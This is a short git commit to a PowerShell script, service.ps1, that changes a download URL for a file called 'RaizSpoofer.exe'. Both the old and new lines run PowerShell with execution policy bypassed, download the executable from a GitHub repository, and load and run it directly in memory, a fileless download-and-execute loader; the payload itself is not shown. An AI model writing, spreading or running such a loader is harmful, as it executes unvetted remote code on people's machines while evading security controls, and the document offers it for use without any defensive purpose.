c8564c493d66c7c8f2c047e799b55e29672fea67
tyu0720gyi <tr5457075@gmail.com>
2026-03-25 14:42:54 +0900

    Fix URL in service.ps1 for RaizSpoofer.exe

--- service.ps1
+++ service.ps1
@@ -1,3 +1,3 @@
-powershell -ep bypass -c "$data = (New-Object Net.WebClient).DownloadData('https://github.com/tyu0720gyi/service/blob/main/Raiz%20Spoofer.exe'); [System.Reflection.Assembly]::Load($data).EntryPoint.Invoke($null, $null)"
+powershell -ep bypass -c "$data = (New-Object Net.WebClient).DownloadData('https://github.com/tyu0720gyi/service/blob/main/RaizSpoofer.exe'); [System.Reflection.Assembly]::Load($data).EntryPoint.Invoke($null, $null)"
 
 Write-Host "Load!" -ForegroundColor Cyan
